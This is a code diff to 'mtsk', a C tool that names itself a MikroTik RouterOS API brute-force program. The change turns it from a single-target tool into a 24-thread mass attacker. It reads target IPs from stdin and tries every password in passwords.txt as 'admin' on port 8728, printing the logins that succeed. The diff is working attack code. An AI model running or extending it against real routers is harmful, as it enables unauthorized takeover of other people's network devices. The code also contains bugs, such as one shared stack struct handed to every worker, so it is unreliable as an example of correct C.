@@ -29,7 +29,16 @@
 #include "socket.h"
 #include "stringlist.h"
 
+#include "threadpool/threadpool.h"
+
 #define BUF_SIZE 1024
+
+typedef struct {
+	char *target;
+	uint16_t port;
+	char *username;
+	stringlist_t *passwords;
+} mtsk_worker_args_t;
 
 unsigned char pkt_login[] = { 0x06, 0x2f, 0x6c, 0x6f, 0x67, 0x69, 0x6e, 0x00 };
 unsigned char pkt_login_rpl_1[] = { 0x05, 0x21, 0x64, 0x6f, 0x6e, 0x65, 0x25 };
@@ -101,27 +110,53 @@ int mtsk_routeros_command_login(int sockfd, const char *username,
 	return 0;
 }
 
+void worker(void *args)
+{
+	mtsk_worker_args_t *wargs = (char *)args;
+	printf("Worker %d - %s:%d\n", getpid(), wargs->target, wargs->port);
+
+	for (int i = 0; i < wargs->passwords->size; ++i) {
+		int sockfd = mtsk_socket_connect(inet_addr(wargs->target),
+						 wargs->port, 500000);
+
+		if (sockfd > 0) {
+			char *password = wargs->passwords->elements[i];
+			if (strcmp(password, "\n") == 0) {
+				password[0] = '\0';
+			}
+			int ret = mtsk_routeros_command_login(
+				sockfd, wargs->username, password);
+			if (ret == 0) {
+				printf("%s:%d \"%s\" \"%s\" - OK\n",
+				       wargs->target, wargs->port,
+				       wargs->username, password);
+				close(sockfd);
+				return;
+			} else {
+				fprintf(stderr, "%s:%d \"%s\" \"%s\" - FAIL\n",
+					wargs->target, wargs->port,
+					wargs->username, password);
+			}
+		}
+		if (sockfd > 0)
+			close(sockfd);
+	}
+}
+
 int main(int argc, char **argv)
 {
 	puts("mtsk - MikroTik RouterOS API bruteforce v0.1");
 	puts("https://github.com/matricali/mtsk");
 	puts("");
 
-	if (argc < 5) {
-		printf("Invalid parameters!\n"
-		       "usage: %s TARGET PORT USERNAME PASSWORD\n\n",
-		       argv[0]);
-		exit(EXIT_FAILURE);
-	}
-
 	char *target = NULL;
 	uint16_t port = 8728;
 	char *username = "admin";
 	stringlist_t *passwords = NULL;
+	threadpool_t *tp = NULL;
 
-	target = strdup(argv[1]);
-	port = atoi(argv[2]);
-	username = strdup(argv[3]);
+	/* Init worker threads */
+	tp = threadpool_create(24);
 
 	/* Load passwords */
 	passwords = stringlist_load_file("passwords.txt");
@@ -131,29 +166,22 @@ int main(int argc, char **argv)
 	}
 	printf("Loaded %d passwords.\n", passwords->size);
 
-	printf("Probing %s...\n", target);
+	/* Load targets */
+	char line[BUFSIZ] = { 0 };
+	size_t len;
 
-	for (int i = 0; i < passwords->size; ++i) {
-		int sockfd =
-			mtsk_socket_connect(inet_addr(target), port, 500000);
-
-		if (sockfd > 0) {
-			char *password = passwords->elements[i];
-			int ret = mtsk_routeros_command_login(sockfd, username,
-							      password);
-			if (ret == 0) {
-				printf("%s:%d \"%s\" \"%s\" - OK\n", target,
-				       port, username, password);
-				close(sockfd);
-				exit(EXIT_SUCCESS);
-			} else {
-				fprintf(stderr, "%s:%d \"%s\" \"%s\" - FAIL\n",
-					target, port, username, password);
-			}
-		}
-		if (sockfd > 0)
-			close(sockfd);
+	while ((len = fgets(line, sizeof line, stdin)) > 0) {
+		line[strcspn(line, "\n")] = 0;
+		mtsk_worker_args_t wargs = { 0 };
+		wargs.target = line;
+		wargs.port = 8728;
+		wargs.username = username;
+		wargs.passwords = passwords;
+		threadpool_add_work(tp, &worker, &wargs);
 	}
 
-	return EXIT_FAILURE;
+	threadpool_wait(tp);
+	threadpool_destroy(tp);
+
+	return EXIT_SUCCESS;
 }
